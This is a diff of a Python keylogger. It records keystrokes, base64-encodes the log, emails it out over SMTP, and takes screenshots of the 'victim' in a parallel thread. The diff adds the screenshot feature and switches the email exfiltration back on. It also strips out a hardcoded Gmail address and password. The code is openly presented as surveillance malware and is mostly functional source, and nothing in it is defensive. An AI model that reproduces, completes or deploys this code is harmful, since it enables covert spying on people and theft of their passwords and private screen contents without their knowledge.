@@ -1,9 +1,32 @@
+'''
+
+A simple python keylogger built to log key strokes and remotely
+send base64 encoded file to the specified email address.
+It also has the added feature to caputre screenshots on a different
+thread simultaneously while keylogger is running in the main.
+
+Currently this is a command-line application tested on Linux environment
+
+python version :- 3.9.7
+
+install pynput:-
+pip install pynput
+
+install pillow for image processing:-
+pip install pillow
+
+'''
+
+
+#importing necessary libraries and modules 
 from pynput import keyboard
 import base64
 import smtplib, ssl
-import threading
-import os
+from PIL import ImageGrab
 import datetime
+import os
+import time
+import threading
 
 
 substitute ={
@@ -26,13 +49,16 @@ substitute ={
 	}
 
 
+#send file to the specified email
 def send_log():
 
-	port=465
+	#port for ssl
+	port=465 
 
-	sender_mail = "dummyboii666@gmail.com"
-	password = "Password not to forget"
-	receiver_email = "dummyboii666+some@gmail.com"
+	#change email credentials as per requirement
+	sender_mail = "........"
+	password = "........."
+	receiver_email = "........................"
 
 	# Create a secure SSL context
 	context = ssl.create_default_context()
@@ -49,6 +75,7 @@ def send_log():
 		print("[+] the logs has been sent....")
 
 
+#base64 encode the file
 def encode(filename):
 	with open(filename,"r") as file:
 		data = file.read()
@@ -65,28 +92,48 @@ def on_press(key):
 			logs.write(substitute[str(key)]+" ")
 
 def on_release(key):
+	#user can make a timer function to send log files in the specified interval
+
+	#for debugging and testing locally, the following code is used
 	if key==keyboard.Key.esc:
 		print("\n")
 		print("[+] the listener will stop working")
-		# send_log()
+		
+		send_log()
 
 		print("[-] the program will close in T minus 5 seconds...")
 		return False
 
 
-# with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-# 	listener.join(5) # close after 5 secs.
+with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+	#close the program after 5 sec after pressing esc key
+	listener.join(5) 
 
-def continous_send_logs():
-	logfile_name = str(datetime.datetime.now())
 
-	try:
-		os.mkdir("logs")
-	except FileExistsError:
-		pass
+# <------ code for capturing screenshot of victim -------------------->
 
-x = encode("asset/logs.txt")
-print(x)
+
+def screenshot():
+
+	#make a directory to store screenshots
+    try:
+        os.mkdir("screenshots")
+    except FileExistsError:
+        pass
+
+    #capture 6 screenshots within timeperiod
+    #modify to increase screenshots volume
+    for i in range(5):
+        time.sleep(3)
+        filepath = "screenshots/"+str(datetime.datetime.now())+".png"
+        screenshot = ImageGrab.grab()
+        screenshot.save(filepath)
+
+#start a thread to begin along with keylogger section
+#rearrange sections of code as per convenience
+proc1 = threading.Thread(target=screenshot)
+
+proc1.start()
 
 
 
